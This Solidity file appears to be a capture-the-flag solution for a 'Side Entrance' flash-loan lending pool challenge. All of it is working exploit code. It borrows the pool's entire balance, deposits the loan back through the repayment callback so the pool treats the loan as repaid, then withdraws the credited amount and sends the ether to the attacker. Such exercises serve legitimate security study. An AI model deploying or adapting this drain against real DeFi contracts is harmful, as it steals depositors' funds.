pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackerSideEntrance is IFlashLoanEtherReceiver {
    using Address for address payable;

    function execute() external payable override {
        SideEntranceLenderPool(msg.sender).deposit{ value: msg.value }();
    }

    function exploit(SideEntranceLenderPool lendingPool) public {
        lendingPool.flashLoan(address(lendingPool).balance);
        lendingPool.withdraw();

        msg.sender.sendValue(address(this).balance);
    }

    // solhint-disable-next-line no-empty-blocks
    receive() external payable {}
}
